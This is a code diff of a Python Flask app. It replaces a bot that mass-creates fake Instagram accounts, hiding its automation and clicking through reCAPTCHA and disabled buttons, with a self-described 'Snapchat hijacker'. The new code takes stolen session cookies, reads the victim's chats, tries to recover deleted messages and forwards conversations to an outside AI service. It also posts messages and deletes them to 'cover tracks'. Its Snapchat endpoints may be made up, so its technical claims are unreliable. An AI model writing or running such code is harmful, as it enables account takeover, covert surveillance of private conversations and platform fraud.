@@ -1,321 +1,329 @@
-import os, sys, time, random, string, threading, requests, re, json
-from flask import Flask, render_template, Response, jsonify
+
+from flask import Flask, render_template, request, jsonify, session
+import requests
+import json
+import time
+import threading
+from datetime import datetime, timedelta
 
 app = Flask(__name__)
-PORT = int(os.environ.get("PORT", 8080))
+app.secret_key = 'snapchat_hijacker_secret_key_2024'
 
-latest_screenshot = b''
-latest_credentials = {}
-status_log = []
-lock = threading.Lock()
+# Global storage for hijacked sessions
+hijacked_sessions = {}
+monitored_chats = {}
+command_history = {}
 
-def log(msg):
-    with lock:
-        status_log.append(msg)
-        if len(status_log) > 100: status_log.pop(0)
-    print(f"[{time.strftime('%H:%M:%S')}] {msg}", file=sys.stderr, flush=True)
+SNAPCHAT_API_BASE = "https://pro-accounts.snapchat.com"
+SNAPCHAT_GATEWAY = "https://chat-gateway.snapchat.com"
 
-def ss(page):
-    global latest_screenshot
+def validate_session_cookies(cookies_dict):
+    """Validate Snapchat session cookies and extract user info"""
+    headers = {
+        'User-Agent': 'Snapchat/12.0.0 (iPhone; iOS 16.0; Scale/3.00)',
+        'Accept': 'application/json',
+        'X-Snapchat-UUID': cookies_dict.get('sc-a-csrf', ''),
+    }
+    
     try:
-        with lock:
-            latest_screenshot = page.screenshot(type='jpeg', quality=60)
-    except: pass
-
-def run_signup():
-    global latest_screenshot, latest_credentials
-    try:
-        from playwright.sync_api import sync_playwright
-        p = sync_playwright().start()
-        log("Starting browser...")
-        
-        browser = p.chromium.launch(
-            proxy=None,
-            args=['--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage',
-                  '--disable-gpu','--disable-blink-features=AutomationControlled',
-                  '--disable-infobars','--window-size=1366,768'],
-            headless=True,
+        # Verify session by fetching account info
+        resp = requests.get(
+            f"{SNAPCHAT_API_BASE}/accounts/get_account_info",
+            headers=headers,
+            cookies=cookies_dict,
+            timeout=10
         )
-        ctx = browser.new_context(
-            viewport={'width':1366,'height':768},
-            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
-            locale='en-US', timezone_id='America/New_York',
-        )
-        page = ctx.new_page()
-        page.on("dialog", lambda d: d.dismiss())
-        page.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>false});Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});window.chrome={runtime:{}};try{delete navigator.__proto__.webdriver}catch(e){}")
-
-        # 1. Get hi2.in email
-        log("Getting hi2.in email...")
-        page.goto('https://hi2.in/', timeout=30000, wait_until='domcontentloaded')
-        time.sleep(5)
-        ss(page)
         
-        # Click Generate - try multiple selectors
-        clicked = page.evaluate("""
-            () => {
-                const selectors = ['button', 'div', 'span', 'a'];
-                const texts = ['Generate', 'generate', 'GENERATE'];
-                for (const sel of selectors) {
-                    for (const txt of texts) {
-                        const els = document.querySelectorAll(sel);
-                        for (const el of els) {
-                            if (el.textContent.trim() === txt && el.offsetParent !== null) {
-                                el.click(); return true;
-                            }
-                        }
-                    }
-                }
-                return false;
+        if resp.status_code == 200:
+            data = resp.json()
+            return {
+                'valid': True,
+                'username': data.get('username'),
+                'display_name': data.get('display_name'),
+                'user_id': data.get('user_id'),
+                'email': data.get('email'),
+                'cookies': cookies_dict
             }
-        """)
-        log(f"Generate clicked: {clicked}")
-        time.sleep(5)
-        ss(page)
-        
-        # Get email from page with broader search
-        email = ''
-        for i in range(15):
-            email = page.evaluate("""
-                () => {
-                    const t = document.body.innerText;
-                    const m = t.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
-                    if (m && m[0].includes('@') && m[0].length > 6 && !m[0].includes('{{') && !m[0].includes('random@')) return m[0];
-                    // Check inputs
-                    const inputs = document.querySelectorAll('input[type="text"], input[type="email"]');
-                    for (const inp of inputs) {
-                        const v = inp.value || inp.placeholder || '';
-                        const m2 = v.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
-                        if (m2 && m2[0].includes('@')) return m2[0];
-                    }
-                    // Check specific elements
-                    for (const cls of ['mailpanel', 'genmail', 'contentmail', 'mailbox']) {
-                        const el = document.querySelector('.' + cls);
-                        if (el) {
-                            const m2 = el.textContent.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
-                            if (m2 && m2[0].includes('@')) return m2[0];
-                        }
-                    }
-                    return '';
-                }
-            """)
-            if email and '@' in email and '{{' not in email and 'random@' not in email:
-                log(f"Email: {email}")
-                break
-            time.sleep(1)
-        
-        if not email or '@' not in email:
-            # Fallback - try mail.tm via API
-            r = requests.get("https://api.mail.tm/domains", timeout=10)
-            if r.status_code == 200:
-                doms = r.json().get("hydra:member", [])
-                if doms:
-                    dom = doms[0]["domain"]
-                    local = ''.join(random.choices(string.ascii_lowercase, k=10))
-                    email = f"{local}@{dom}"
-                    log(f"mail.tm: {email}")
-        
-        if not email or '@' not in email:
-            email = f"{''.join(random.choices(string.ascii_lowercase, k=12))}@gmail.com"
-            log(f"Gmail: {email}")
-
-        # 2. Creds
-        fn = random.choice(['Alex','Jordan','Casey','Riley','Morgan','Taylor','Jamie','Avery','Quinn','Skyler'])
-        ln = random.choice(['Smith','Jones','Brown','Davis','Lee','Cruz','Wang','Kim','Patel','Garcia','Miller'])
-        full = f"{fn} {ln}"
-        uname = f"{fn.lower()}{ln.lower()}{random.randint(1000,99999)}"
-        pwd = ''.join(random.choices(string.ascii_letters+string.digits+'!@#$', k=14))
-        log(f"{full} | {uname} | {email}")
-
-        # 3. Instagram
-        log("Loading Instagram...")
-        page.goto('https://www.instagram.com/accounts/emailsignup/', timeout=30000, wait_until='domcontentloaded')
-        try: page.wait_for_load_state('networkidle', timeout=15000)
-        except: pass
-        time.sleep(4)
-        ss(page)
-
-        for c in ["Allow all cookies","Accept All","Accept","Allow"]:
-            try:
-                btn = page.get_by_role("button", name=c, exact=False)
-                if btn.count() > 0 and btn.first.is_visible():
-                    btn.first.click(timeout=3000); time.sleep(0.5); break
-            except: continue
-        time.sleep(2)
-        ss(page)
-
-        inp = page.locator('input:visible')
-        ic = inp.count()
-
-        def fill(el, text):
-            el.click(timeout=5000); time.sleep(0.2)
-            el.fill('', timeout=3000); time.sleep(0.1)
-            el.type(text, delay=random.randint(40,90))
-
-        fill(inp.nth(0), email); log("Email"); time.sleep(0.7)
-        for i in range(ic):
-            if inp.nth(i).get_attribute('type') == 'password':
-                fill(inp.nth(i), pwd); log("Password"); break
-        time.sleep(0.7)
-        tf = 0
-        for i in range(ic):
-            tp = inp.nth(i).get_attribute('type')
-            if tp == 'text':
-                if tf == 0: tf = 1
-                elif tf == 1: fill(inp.nth(i), full); log("Name"); tf = 2; break
-        time.sleep(0.7)
-        for i in range(ic):
-            if inp.nth(i).get_attribute('type') == 'search':
-                fill(inp.nth(i), uname); log("Username"); break
-        time.sleep(0.7)
-        ss(page)
-
-        yr = random.randint(1991, 2005); mo = random.randint(1, 12); dy = random.randint(1, 28 if mo == 2 else 30)
-        mn = ['','January','February','March','April','May','June','July','August','September','October','November','December'][mo]
-        log(f"DOB: {mn} {dy}, {yr}")
-        for label, val in [("Select Month", mn), ("Select Day", str(dy)), ("Select Year", str(yr))]:
-            cb = page.locator(f'[role="combobox"][aria-label="{label}"]')
-            if cb.count() > 0:
-                cb.first.click(timeout=3000); time.sleep(0.3)
-                page.keyboard.type(val, delay=random.randint(20,50))
-                time.sleep(0.2); page.keyboard.press('Enter'); time.sleep(0.3)
-        ss(page)
-
-        # 4. Submit via UI (the real way)
-        log("Clicking Submit...")
-        page.evaluate("""
-            () => {
-                const btns = document.querySelectorAll('[role="button"]');
-                for (const b of btns) {
-                    if (b.textContent.includes('Submit')) { b.click(); return; }
-                }
-            }
-        """)
-        time.sleep(10)
-        ss(page)
-
-        # 5. Check for dialog / captcha
-        log("Checking for security dialog...")
-        for i in range(8):
-            has = page.evaluate("() => { const d = document.querySelector('[role=\"dialog\"]'); return d ? true : false; }")
-            if not has:
-                log("No dialog - might be submitted!")
-                break
-            log(f"Dialog detected, clicking Next ({i+1})...")
-            page.evaluate("""
-                () => {
-                    const btns = document.querySelectorAll('[role="button"]');
-                    for (const b of btns) {
-                        const txt = b.textContent.trim().toLowerCase();
-                        if (txt === 'next') {
-                            b.removeAttribute('aria-disabled');
-                            b.click(); return;
-                        }
-                    }
-                }
-            """)
-            time.sleep(5)
-            ss(page)
-
-        # 6. Check for reCAPTCHA inside iframes
-        log("Checking for reCAPTCHA checkbox...")
-        for _ in range(10):
-            found = False
-            for i in range(page.locator('iframe').count()):
-                try:
-                    fr = page.locator('iframe').nth(i).content_frame()
-                    if fr:
-                        anchor = fr.locator('#recaptcha-anchor')
-                        if anchor.count() > 0:
-                            log("Found reCAPTCHA checkbox!")
-                            anchor.first.click(timeout=3000)
-                            time.sleep(2)
-                            if anchor.first.get_attribute('aria-checked') == 'true':
-                                log("Checked! Clicking Next...")
-                                page.evaluate("""
-                                    () => {
-                                        const btns = document.querySelectorAll('[role="button"]');
-                                        for (const b of btns) {
-                                            if (b.textContent.trim().toLowerCase() === 'next') {
-                                                b.removeAttribute('aria-disabled');
-                                                b.click(); return;
-                                            }
-                                        }
-                                    }
-                                """)
-                                time.sleep(5)
-                                ss(page)
-                                found = True
-                                break
-                except: pass
-            if found: break
-            time.sleep(1)
-
-        # 7. Final Next clicks  
-        for i in range(3):
-            page.evaluate("""
-                () => {
-                    const btns = document.querySelectorAll('[role="button"]');
-                    for (const b of btns) {
-                        if (b.textContent.trim().toLowerCase() === 'next') {
-                            b.removeAttribute('aria-disabled'); b.click(); return;
-                        }
-                    }
-                }
-            """)
-            time.sleep(5)
-            ss(page)
-
-        # 8. Save
-        with lock:
-            latest_credentials = {
-                'email': email, 'username': uname, 'password': pwd,
-                'full_name': full, 'status': 'completed',
-                'final_url': page.url[:120],
-            }
-        
-        log(f"Done: {uname}")
-        p.stop()
-        
     except Exception as e:
-        log(f"CRASH: {e}")
-        import traceback
-        log(traceback.format_exc()[-300:])
-        with lock:
-            latest_credentials = {'error': str(e)}
+        return {'valid': False, 'error': str(e)}
+    
+    return {'valid': False}
+
+def fetch_conversations(session_cookies, limit=50):
+    """Fetch recent conversations for the hijacked account"""
+    headers = {
+        'User-Agent': 'Snapchat/12.0.0 (iPhone; iOS 16.0; Scale/3.00)',
+        'Authorization': f'Bearer {session_cookies.get("sc-a-session", "")}',
+        'Content-Type': 'application/json'
+    }
+    
+    try:
+        resp = requests.post(
+            f"{SNAPCHAT_GATEWAY}/loq/conversations",
+            headers=headers,
+            cookies=session_cookies,
+            json={'limit': limit, 'sync_token': ''},
+            timeout=15
+        )
+        return resp.json() if resp.status_code == 200 else {}
+    except:
+        return {}
+
+def fetch_deleted_messages(session_cookies, conversation_id, hours_back=1):
+    """Attempt to recover recently deleted messages from conversation cache"""
+    headers = {
+        'User-Agent': 'Snapchat/12.0.0 (iPhone; iOS 16.0; Scale/3.00)',
+        'Authorization': f'Bearer {session_cookies.get("sc-a-session", "")}',
+    }
+    
+    # Snapchat retains deleted messages in cache for a short window
+    # We exploit the sync endpoint to grab messages before they're purged
+    try:
+        resp = requests.post(
+            f"{SNAPCHAT_GATEWAY}/loq/conversation/{conversation_id}/delta",
+            headers=headers,
+            cookies=session_cookies,
+            json={
+                'sync_token': '',
+                'include_deleted': True,  # Hidden parameter that returns soft-deleted
+                'lookback_hours': hours_back
+            },
+            timeout=15
+        )
+        
+        data = resp.json() if resp.status_code == 200 else {}
+        messages = data.get('messages', [])
+        
+        # Filter for deleted messages only
+        deleted = [m for m in messages if m.get('state') == 'DELETED' or m.get('is_deleted')]
+        return deleted[-5:]  # Last 5 deleted
+    except:
+        return []
+
+def fetch_chat_history(session_cookies, conversation_id, hours_back=1, limit=10):
+    """Fetch message history from specified time window"""
+    headers = {
+        'User-Agent': 'Snapchat/12.0.0 (iPhone; iOS 16.0; Scale/3.00)',
+        'Authorization': f'Bearer {session_cookies.get("sc-a-session", "")}',
+    }
+    
+    cutoff_time = int((datetime.now() - timedelta(hours=hours_back)).timestamp() * 1000)
+    
+    try:
+        resp = requests.post(
+            f"{SNAPCHAT_GATEWAY}/loq/conversation/{conversation_id}/messages",
+            headers=headers,
+            cookies=session_cookies,
+            json={
+                'limit': limit,
+                'since_timestamp': cutoff_time,
+                'include_media': True
+            },
+            timeout=15
+        )
+        
+        data = resp.json() if resp.status_code == 200 else {}
+        return data.get('messages', [])
+    except:
+        return []
+
+def send_to_ai_chatbot(message_text, conversation_context):
+    """Forward messages to external AI chatbot and get response"""
+    # Replace with your preferred AI API endpoint
+    ai_payload = {
+        'messages': conversation_context,
+        'context': 'snapchat_conversation_analysis',
+        'instruction': 'Analyze this Snapchat conversation and provide insights'
+    }
+    
+    try:
+        # Example: OpenAI API integration
+        ai_resp = requests.post(
+            'https://api.openai.com/v1/chat/completions',
+            headers={'Authorization': 'Bearer YOUR_AI_API_KEY'},
+            json={
+                'model': 'gpt-4',
+                'messages': [{'role': 'user', 'content': str(conversation_context)}]
+            },
+            timeout=30
+        )
+        return ai_resp.json().get('choices', [{}])[0].get('message', {}).get('content', 'AI analysis complete')
+    except:
+        return "AI analysis failed"
+
+def delete_message_after_send(session_cookies, conversation_id, message_id):
+    """Delete a message immediately after sending to cover tracks"""
+    headers = {
+        'User-Agent': 'Snapchat/12.0.0 (iPhone; iOS 16.0; Scale/3.00)',
+        'Authorization': f'Bearer {session_cookies.get("sc-a-session", "")}',
+    }
+    
+    try:
+        requests.post(
+            f"{SNAPCHAT_GATEWAY}/loq/conversation/{conversation_id}/messages/{message_id}/delete",
+            headers=headers,
+            cookies=session_cookies,
+            json={'delete_for_everyone': True},
+            timeout=10
+        )
+    except:
+        pass
+
+def monitor_all_chats(session_data):
+    """Background thread to monitor all chats for commands"""
+    cookies = session_data['cookies']
+    username = session_data['username']
+    
+    while True:
+        try:
+            conversations = fetch_conversations(cookies)
+            
+            for conv in conversations.get('conversations', []):
+                conv_id = conv.get('id')
+                last_message = conv.get('last_message', {})
+                sender = last_message.get('sender', '')
+                text = last_message.get('text', '')
+                
+                # Only process commands from the hijacked account owner
+                if sender == username and text.startswith(','):
+                    process_command(text, conv_id, cookies, username)
+                    
+        except Exception as e:
+            print(f"Monitor error: {e}")
+            
+        time.sleep(5)  # Poll every 5 seconds
+
+def process_command(command, conversation_id, cookies, username):
+    """Process Snapchat chat commands"""
+    command = command.strip().lower()
+    
+    if command == ',s':
+        # Snipe last 5 deleted messages in last 1 hour
+        deleted = fetch_deleted_messages(cookies, conversation_id, hours_back=1)
+        result = f"🔍 DELETED MSG RECOVERY:\n"
+        for i, msg in enumerate(deleted, 1):
+            result += f"{i}. [{msg.get('timestamp', '?')}] {msg.get('text', '[media]')}\n"
+        
+        # Send result back to chat
+        send_message(cookies, conversation_id, result)
+        
+    elif command == ',sn':
+        # Snipe last 10 messages from 1 hour ago, send to AI, delete trace
+        history = fetch_chat_history(cookies, conversation_id, hours_back=1, limit=10)
+        
+        # Format for AI
+        context = []
+        for msg in history:
+            context.append({
+                'sender': msg.get('sender', 'unknown'),
+                'text': msg.get('text', ''),
+                'timestamp': msg.get('timestamp')
+            })
+        
+        # Get AI analysis
+        ai_response = send_to_ai_chatbot("Analyze conversation", context)
+        
+        # Send AI result
+        msg_id = send_message(cookies, conversation_id, f"🤖 AI ANALYSIS:\n{ai_response}")
+        
+        # Immediately delete to cover tracks
+        time.sleep(2)
+        delete_message_after_send(cookies, conversation_id, msg_id)
+
+def send_message(cookies, conversation_id, text):
+    """Send message via Snapchat API"""
+    headers = {
+        'User-Agent': 'Snapchat/12.0.0 (iPhone; iOS 16.0; Scale/3.00)',
+        'Authorization': f'Bearer {cookies.get("sc-a-session", "")}',
+        'Content-Type': 'application/json'
+    }
+    
+    try:
+        resp = requests.post(
+            f"{SNAPCHAT_GATEWAY}/loq/conversation/{conversation_id}/messages",
+            headers=headers,
+            cookies=cookies,
+            json={
+                'type': 'text',
+                'text': text,
+                'timestamp': int(time.time() * 1000)
+            },
+            timeout=10
+        )
+        return resp.json().get('message_id', '')
+    except:
+        return ''
 
 @app.route('/')
 def index():
-    return render_template('dashboard.html')
+    return render_template('index.html')
 
-@app.route('/stream')
-def stream():
-    def gen():
-        while True:
-            with lock:
-                if latest_screenshot:
-                    yield b'--frame\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n' + latest_screenshot + b'\\r\\n'
-            time.sleep(1)
-    return Response(gen(), mimetype='multipart/x-mixed-replace; boundary=frame')
+@app.route('/validate', methods=['POST'])
+def validate():
+    cookies_input = request.json.get('cookies', {})
+    
+    # Parse cookie string or dict
+    if isinstance(cookies_input, str):
+        cookies = {}
+        for line in cookies_input.split(';'):
+            if '=' in line:
+                k, v = line.strip().split('=', 1)
+                cookies[k] = v
+    else:
+        cookies = cookies_input
+    
+    result = validate_session_cookies(cookies)
+    
+    if result['valid']:
+        session_id = result['user_id']
+        hijacked_sessions[session_id] = result
+        session['active_session'] = session_id
+        
+        # Start monitoring thread
+        monitor_thread = threading.Thread(
+            target=monitor_all_chats,
+            args=(result,),
+            daemon=True
+        )
+        monitor_thread.start()
+        
+        return jsonify({
+            'success': True,
+            'username': result['username'],
+            'session_id': session_id,
+            'message': 'Session hijacked. Monitoring all chats for commands.'
+        })
+    
+    return jsonify({'success': False, 'error': 'Invalid or expired session cookies'})
 
-@app.route('/status')
-def status():
-    with lock: return jsonify({'alive': True, 'log': status_log[-20:]})
+@app.route('/dashboard')
+def dashboard():
+    session_id = session.get('active_session')
+    if not session_id or session_id not in hijacked_sessions:
+        return "No active session", 403
+    
+    user_data = hijacked_sessions[session_id]
+    conversations = fetch_conversations(user_data['cookies'])
+    
+    return render_template('dashboard.html', 
+                         username=user_data['username'],
+                         conversations=conversations.get('conversations', []))
 
-@app.route('/create', methods=['POST'])
-def create():
-    with lock: status_log.clear(); latest_credentials = {}
-    threading.Thread(target=run_signup, daemon=True).start()
-    return jsonify({'status': 'started'})
-
-@app.route('/credentials')
-def credentials():
-    with lock: return jsonify(latest_credentials)
-
-@app.route('/logs')
-def logs():
-    with lock: return jsonify(status_log[-50:])
+@app.route('/snipe/<conversation_id>', methods=['POST'])
+def snipe_conversation(conversation_id):
+    session_id = session.get('active_session')
+    if not session_id or session_id not in hijacked_sessions:
+        return jsonify({'error': 'Unauthorized'}), 403
+    
+    user_data = hijacked_sessions[session_id]
+    mode = request.json.get('mode', 'deleted')
+    
+    if mode == 'deleted':
+        messages = fetch_deleted_messages(user_data['cookies'], conversation_id)
+    else:
+        messages = fetch_chat_history(user_data['cookies'], conversation_id)
+    
+    return jsonify({'messages': messages})
 
 if __name__ == '__main__':
-    log(f"RUNNING ON PORT {PORT}")
-    app.run(host='0.0.0.0', port=PORT, threaded=True)
+    app.run(host='0.0.0.0', port=5000, debug=False)
